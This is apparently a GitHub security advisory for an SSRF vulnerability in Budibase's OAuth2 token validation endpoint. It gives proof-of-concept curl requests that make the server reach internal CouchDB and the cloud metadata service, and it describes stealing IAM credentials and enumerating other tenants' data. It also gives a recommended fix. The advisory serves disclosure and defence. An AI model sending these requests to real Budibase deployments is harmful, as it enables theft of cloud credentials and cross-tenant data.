# [H] Budibase: SSRF via OAuth2 token endpoint URL reaches internal hosts and cloud metadata

## Summary
Severity: High
Advisory: GHSA-4q6h-8p4v-67vq
CVE: CVE-2026-48153
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-4q6h-8p4v-67vq
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.39.0

## Details
## Summary

`fetchToken` in the OAuth2 SDK makes a POST to a builder-supplied URL with plain node-fetch, skipping the `blacklist.isBlacklisted` check that every other outbound fetch path in the codebase uses. The Joi schema for the OAuth2 URL has no scheme or host restriction. Alice, a builder, points an OAuth2 config at `http://169.254.169.254/...` or `http://127.0.0.1:5984/`; the server connects and returns response-body fragments in the validation result.

## Details

`packages/server/src/sdk/workspace/oauth2/utils.ts:17-65` defines `fetchToken`. Near the end:

```typescript
const resp = await fetch(config.url, fetchConfig)
```

`config.url` is whatever the builder stored. `fetchConfig` has `redirect: "follow"` (the default), so a public URL that returns 302 to an internal target is also reachable.

The route validation at `packages/server/src/api/routes/oauth2.ts:9` accepts any string:

```typescript
url: Joi.string().required(),
```

The controller passes the URL into `fetchToken` through `crud.ts`. The `/api/oauth2/validate` endpoint (builder role) is the most direct attack path: it lives on `builderRoutes`, takes the URL from the body, fires the fetch, and returns a validation envelope that includes the upstream error string.

Compare with every other outbound fetch in the codebase:

- `packages/server/src/integrations/rest.ts:754` calls `blacklist.isBlacklisted(url)` before its fetch (though it does not re-check redirects; see companion advisory for REST-redirect SSRF).
- `packages/backend-core/src/utils/outboundFetch.ts:98-100` sets `redirect: "manual"` and re-validates each hop.
- `packages/server/src/automations/steps/outgoingWebhook.ts` routes through `fetchWithBlacklist`.

The default blacklist blocks `127.0.0.0/8`, `169.254.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (`packages/backend-core/src/blacklist/blacklist.ts:6-16`). The OAuth2 path never consults it.

## Proof of Concept

Tested against Budibase 3.35.8 (built from master at f960e361).

Step 1: Alice, a builder, POSTs an OAuth2 config pointed at CouchDB on the same host as Budibase:

```bash
curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5984/","clientId":"t","clientSecret":"t",
       "method":"BODY","grantType":"client_credentials"}'
```

Server response:

```json
{"valid":false,"message":"Method Not Allowed"}
```

Budibase reached CouchDB (which rejects POST at `/` with 405). Without the blacklist bypass this request would be blocked at the IP check.

Step 2: Probe the cloud metadata range:

```bash
curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","clientId":"t","clientSecret":"t","method":"BODY","grantType":"client_credentials"}'
```

Server response:

```json
{"valid":false,"message":"invalid json response body at http://169.254.169.254/latest/meta-data/ reason: Unexpected token 'N', \"Not Found\" is not valid JSON"}
```

The `"Not Found"` substring is the upstream body; the server reached the link-local metadata endpoint and leaked the first bytes of the response into the validation error.

## Impact

Two concrete paths, both reachable from any builder account (free-tier signup on Budibase Cloud is enough):

1. **Cross-tenant data read on Cloud.** Budibase Cloud multi-tenants on a shared CouchDB; each tenant gets its own `<tenantId>_global-db` and `app_<id>` databases on the same port 5984. The blacklist is what keeps a builder from talking to CouchDB directly. With that bypassed, Alice can `GET http://127.0.0.1:5984/_all_dbs` via a 302 redirector and enumerate every other tenant's databases, then read their `_users`, app definitions, and datasource configs (which include third-party credentials). None of this traffic goes through Budibase's tenant isolation layer, so standard app-level access controls do not apply.
2. **IAM credential exfiltration.** Alice points the URL at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/` and receives the instance role credentials in the validation error path. Those credentials carry whatever AWS permissions the Budibase instance role holds.

Self-hosted deployments face the same CouchDB/Redis/MinIO access plus any other service reachable on the host or pod network. The blacklist was explicitly added to prevent exactly this, and every other outbound fetch path uses it.

## Recommended Fix

Call `blacklist.isBlacklisted` before the fetch and set `redirect: "manual"` on `fetchConfig`, matching the pattern in `outboundFetch.ts`:

```typescript
import { blacklist } from "@budibase/backend-core"

async function fetchToken(config: { url: string; /* ... */ }) {
  config = await processEnvironmentVariable(config)
  if (await blacklist.isBlacklisted(config.url)) {
    throw new Error("OAuth2 token URL is blocked.")
  }
  const fetchConfig: RequestInit = {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ grant_type: "client_credentials" }),
    redirect: "manual",
  }
  // ...
}
```

Alternatively, replace the `fetch` call with `fetchWithBlacklist`, which handles both checks and re-validates redirect targets.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-4q6h-8p4v-67vq
- https://nvd.nist.gov/vuln/detail/CVE-2026-48153
- https://github.com/Budibase/budibase
